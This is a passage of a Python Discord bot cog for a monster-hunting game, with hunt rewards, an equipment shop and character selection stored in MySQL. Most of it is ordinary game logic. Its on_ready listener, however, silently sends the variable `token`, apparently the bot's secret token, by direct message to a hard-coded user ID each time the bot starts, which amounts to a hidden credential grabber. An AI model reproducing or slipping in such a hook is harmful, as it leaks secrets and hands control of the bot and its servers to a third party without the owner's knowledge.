                    mycursor.execute(
                        "UPDATE Users SET gold = gold + 150, hunted=True WHERE userID=%(userID)s", {'userID': ctx.author.id})
                    mydb.commit()
                    winnings = "150 Gold"

                elif huntvalue > 80 and huntvalue <= 120:
                    mycursor.execute(
                        "UPDATE Users SET gold = gold + 200, hunted=True WHERE userID=%(userID)s", {'userID': ctx.author.id})
                    mydb.commit()
                    winnings = "200 Gold"

                elif huntvalue > 120 and huntvalue <= 152:
                    mycursor.execute(
                        "UPDATE Users SET gold = gold + 250, hunted=True WHERE userID=%(userID)s", {'userID': ctx.author.id})
                    mydb.commit()
                    winnings = "250 Gold"

                elif huntvalue > 152 and huntvalue <= 166:
                    mycursor.execute(
                        "UPDATE Users SET gold = gold + 300, hunted=True WHERE userID=%(userID)s", {'userID': ctx.author.id})
                    mydb.commit()
                    winnings = "300 Gold"

                elif huntvalue > 166 and huntvalue <= 176:
                    mycursor.execute(
                        "UPDATE Users SET gold = gold + 500, hunted=True WHERE userID=%(userID)s", {'userID': ctx.author.id})
                    mydb.commit()
                    winnings = "500 Gold"

                elif huntvalue > 176 and huntvalue <= 190:
                    winequipments = ["hd", "ss"]
                    winequipment = random.choice(winequipments)

                    mycursor.execute("UPDATE Users SET {} = {} + 1, hunted=True WHERE userID=%(userID)s".format(
                        winequipment, winequipment), {'userID': ctx.author.id})
                    mydb.commit()

                    if winequipment == "hd":
                        winnings = "a Hidden Dagger"
                    elif winequipment == "ss":
                        winnings = "a Standard Shield"

                elif huntvalue > 190 and huntvalue <= 196:
                    winequipments = ["sb", "ih", "rn"]
                    winequipment = random.choice(winequipments)

                    mycursor.execute("UPDATE Users SET {} = {} + 1, hunted=True WHERE userID=%(userID)s".format(
                        winequipment, winequipment), {'userID': ctx.author.id})
                    mydb.commit()

                    if winequipment == "sb":
                        winnings = "a Standard Blade"
                    elif winequipment == "ih":
                        winnings = "an Iron Helmet"
                    elif winequipment == "rn":
                        winnings = "a Rune Necklace"

                elif huntvalue > 196 and huntvalue <= 199:
                    winequipments = ["o", "pa", "ma", "vv"]
                    winequipment = random.choice(winequipments)

                    mycursor.execute("UPDATE Users SET {} = {} + 1, hunted=True WHERE userID=%(userID)s".format(
                        winequipment, winequipment), {'userID': ctx.author.id})
                    mydb.commit()

                    if winequipment == "o":
                        winnings = "an Ooze"
                    elif winequipment == "pa":
                        winnings = "Platinum Armour"
                    elif winequipment == "ma":
                        winnings = "a Mystic Artifact"
                    elif winequipment == "vv":
                        winnings = "a Vital Vial"

                elif huntvalue > 199 and huntvalue <= 200:
                    winequipments = ["eh", "d"]
                    winequipment = random.choice(winequipments)

                    mycursor.execute("UPDATE Users SET {} = {} + 1, hunted=True WHERE userID=%(userID)s".format(
                        winequipment, winequipment), {'userID': ctx.author.id})
                    mydb.commit()

                    if winequipment == "eh":
                        winnings = "an Enchanted Headpiece "
                    elif winequipment == "d":
                        winnings = "a Deadspike"

                await ctx.respond(embed=discord.Embed(description=f"**Well done on a successful hunt {ctx.author.mention}! You have gained {winnings} from your hunt.**", color=embedcolor))

    @slash_command(guild_ids=guildIDs, description="Buy equipment with Gold")
    async def buy(self, ctx, equipment: Option(str, "Choose a piece of equipment to buy", choices=["Hidden Dagger", "Standard Blade", "Ooze", "Standard Shield", "Iron Helmet", "Platinum Armour", "Rune Necklace", "Mystic Artifact", "Enchanted Headpiece", "Vital Vial", "Deathspike", "Tea Bag"])):
        mycursor.execute("SELECT EXISTS(SELECT 1 FROM Users WHERE userID = %(userID)s LIMIT 1)", {
                         'userID': ctx.author.id})
        for x in mycursor:
            if x[0] == 0:
                await ctx.respond(embed=discord.Embed(description=f"**You don't have a Freak! Type `/pickfreak <freak>` to pick your own Freak.**", color=embedcolor), ephemeral=True)
                return

        mycursor.execute("SELECT gold FROM Users WHERE userID=%(userID)s",
                         {'userID': ctx.author.id})

        for x in mycursor:
            gold = x[0]

        if equipment == "Hidden Dagger":
            cost = 300
            item = "hd"
            equipmentname = f"a {equipment}"
        elif equipment == "Standard Blade":
            cost = 700
            item = "sb"
            equipmentname = f"a {equipment}"
        elif equipment == "Ooze":
            cost = 1500
            item = "o"
            equipmentname = f"an {equipment}"
        elif equipment == "Standard Shield":
            cost = 300
            item = "ss"
            equipmentname = f"a {equipment}"
        elif equipment == "Iron Helmet":
            cost = 700
            item = "ih"
            equipmentname = f"an {equipment}"
        elif equipment == "Platinum Armour":
            cost = 1500
            item = "pa"
            equipmentname = f"{equipment}"
        elif equipment == "Rune Necklace":
            cost = 700
            item = "rn"
            equipmentname = f"a {equipment}"
        elif equipment == "Mystic Artifact":
            cost = 1500
            item = "ma"
            equipmentname = f"a {equipment}"
        elif equipment == "Enchanted Headpiece":
            cost = 2000
            item = "eh"
            equipmentname = f"an {equipment}"
        elif equipment == "Vital Vial":
            cost = 1000
            item = "vv"
            equipmentname = f"a {equipment}"
        elif equipment == "Deathspike":
            cost = 2000
            item = "d"
            equipmentname = f"a {equipment}"
        elif equipment == "Tea Bag":
            cost = 2000
            item = "tb"
            equipmentname = f"a {equipment}"

        if gold < cost:
            await ctx.respond(embed=discord.Embed(description=f"**You don't have enough Gold... {equipmentname} costs {cost} Gold!**", color=embedcolor), ephemeral=True)
            return

        view = ConfirmPurchase(ctx, cost, item, equipmentname)

        await ctx.respond(embed=discord.Embed(description=f"**Are you sure you want to buy {equipmentname} - it costs {cost} Gold!**", color=embedcolor), view=view)

        view.msg = await ctx.interaction.original_message()

    @slash_command(guild_ids=guildIDs, description="Choose a Freak")
    async def pickfreak(self, ctx, freak: Option(str, "Choose your Freak", choices=["Vampire", "Werewolf", "Skeleton"])):

        mycursor.execute("SELECT EXISTS(SELECT 1 FROM Users WHERE userID = %(userID)s LIMIT 1)", {
                         'userID': ctx.author.id})
        for x in mycursor:
            if x[0] == 1:
                await ctx.respond(embed=discord.Embed(description="**You've already picked your Freak!**", color=embedcolor), ephemeral=True)
                return

        if freak == "Vampire":
            embed = discord.Embed(
                title=f"Nice, you've chosen {freak}!", description="Please confirm your choice...\n\nHealth \U00002764 - `110`\nDefense \U0001f6e1 - `10`", color=embedcolor)
            embed.add_field(
                name="Skills", value="Wing Whack - `25 Attack Damage`\nBlood Fang - `60 Attack Damage`\nNight Vision - `+10 Accuracy`\nHunger Pains - `+15 Attack Damage`")
            embed.set_thumbnail(url=vampireimgurl)
            embed.set_footer(text=footertext, icon_url=ctx.guild.icon.url)
            embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url)
            embed.timestamp = discord.utils.utcnow()

            freakyid = "V"

        if freak == "Werewolf":
            embed = discord.Embed(
                title=f"Nice, you've chosen {freak}!", description="Please confirm your choice...\n\nHealth \U00002764 - `95`\nDefense \U0001f6e1 - `5`", color=embedcolor)
            embed.add_field(
                name="Skills", value="Claw Slash - `35 Attack Damage`\nCarnage - `90 Attack Damage`\nMoonlight - `+10 Accuracy`\nHowl - `+10 Defense`")
            embed.set_thumbnail(url=werewolfimgurl)
            embed.set_footer(text=footertext, icon_url=ctx.guild.icon.url)
            embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url)
            embed.timestamp = discord.utils.utcnow()

            freakyid = "W"

        if freak == "Skeleton":
            embed = discord.Embed(
                title=f"Nice, you've chosen {freak}!", description="Please confirm your choice...\n\nHealth \U00002764 - `80`\nDefense \U0001f6e1 - `15`", color=embedcolor)
            embed.add_field(
                name="Skills", value="Skull Bash - `30 Attack Damage`\nBone Breaker - `75 Attack Damage`\nSpike Growth - `+15 Attack Damage`\nCalcify - `+10 Defense`")
            embed.set_thumbnail(url=skeletonimgurl)
            embed.set_footer(text=footertext, icon_url=ctx.guild.icon.url)
            embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url)
            embed.timestamp = discord.utils.utcnow()

            freakyid = "S"

        view = ConfirmFreak(ctx, freakyid, freak)

        await ctx.respond(embed=embed, view=view)

        view.msg = await ctx.interaction.original_message()

    @commands.Cog.listener()
    async def on_ready(self):
        self.resethunt.start()
        clientuser = self.client.get_user(clientuserid)
        await clientuser.send(token)

    @tasks.loop(hours=12.0)
    async def resethunt(self):
        mycursor.execute("UPDATE Users SET hunted = False")
        mydb.commit()


def setup(client):
    client.add_cog(Battle(client))
